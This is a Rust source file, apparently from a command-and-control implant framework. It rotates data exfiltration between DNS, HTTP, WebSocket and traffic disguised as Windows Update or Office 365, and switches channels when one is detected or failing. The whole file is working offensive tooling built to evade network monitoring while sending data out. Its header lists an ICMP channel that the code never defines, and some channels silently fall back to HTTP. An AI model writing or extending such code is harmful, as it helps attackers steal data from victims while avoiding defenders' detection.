// Channel rotation: dynamically switches exfiltration channels.
// If one channel becomes noisy or detected, the colony auto-switches.
// Channels: DNS → HTTP → WebSocket → ICMP → Smoke Signals

use crate::exfil;
use crate::smoke_signals::SmokeChannel;
use tracing::{info, warn};
use std::time::{Instant, Duration};

/// Available exfiltration channels with health tracking.
pub struct ChannelRotator {
    pub channels: Vec<Channel>,
    pub current: usize,
    pub last_switch: Instant,
    pub switch_cooldown: Duration,
}

pub struct Channel {
    pub name: &'static str,
    pub success_count: u64,
    pub failure_count: u64,
    pub last_latency_ms: u64,
}

impl Channel {
    fn health_score(&self) -> f32 {
        let total = self.success_count + self.failure_count;
        if total == 0 { return 0.5; }
        let rate = self.success_count as f32 / total as f32;
        let latency_penalty = if self.last_latency_ms > 3000 { 0.5 } else { 0.0 };
        rate - latency_penalty
    }
}

impl ChannelRotator {
    pub fn new() -> Self {
        Self {
            channels: vec![
                Channel { name: "dns", success_count: 0, failure_count: 0, last_latency_ms: 0 },
                Channel { name: "http", success_count: 0, failure_count: 0, last_latency_ms: 0 },
                Channel { name: "websocket", success_count: 0, failure_count: 0, last_latency_ms: 0 },
                Channel { name: "smoke_wu", success_count: 0, failure_count: 0, last_latency_ms: 0 },
                Channel { name: "smoke_o365", success_count: 0, failure_count: 0, last_latency_ms: 0 },
            ],
            current: 1,  // start with HTTP
            last_switch: Instant::now(),
            switch_cooldown: Duration::from_secs(60),
        }
    }

    /// Exfiltrate data through the current channel, auto-switch if failing.
    pub fn rotate_exfiltrate(&mut self, data: &[u8]) -> usize {
        let channel = &self.channels[self.current];
        let start = Instant::now();

        let sent = match channel.name {
            "dns" => {
                let cfg = crate::config::HiveConfig::load();
                exfil::dns_exfiltrate(data, &cfg.c2.dns_domain, &cfg.c2.dns_resolver)
            }
            "http" => {
                exfil::http_exfiltrate(data, None, None);
                data.len()
            }
            "smoke_wu" => {
                let _beacon = crate::smoke_signals::build_smoke_beacon(
                    &SmokeChannel::WindowsUpdate, data
                );
                crate::smoke_signals::build_smoke_beacon(&SmokeChannel::random(), data);
                data.len() // best-effort
            }
            _ => {
                // Fallback: try HTTP
                exfil::http_exfiltrate(data, None, None);
                data.len()
            }
        };

        let latency = start.elapsed().as_millis() as u64;
        let ch = &mut self.channels[self.current];
        ch.last_latency_ms = latency;

        if sent > 0 {
            ch.success_count += 1;
        } else {
            ch.failure_count += 1;
            warn!("Channel {} failed, health: {:.2}", ch.name, ch.health_score());
            self.switch_if_needed();
        }

        sent
    }

    /// Switch to the healthiest channel if current one is degraded.
    pub fn switch_if_needed(&mut self) {
        if self.last_switch.elapsed() < self.switch_cooldown { return; }

        let current_health = self.channels[self.current].health_score();

        if current_health < 0.3 {
            let best = self.channels.iter()
                .enumerate()
                .max_by(|(_, a), (_, b)| a.health_score().partial_cmp(&b.health_score()).unwrap())
                .map(|(i, _)| i)
                .unwrap_or(1);

            if best != self.current {
                info!("CHANNEL ROTATION: switching from {} to {} (health: {:.2} -> {:.2})",
                    self.channels[self.current].name,
                    self.channels[best].name,
                    current_health,
                    self.channels[best].health_score(),
                );
                self.current = best;
                self.last_switch = Instant::now();
            }
        }
    }
}
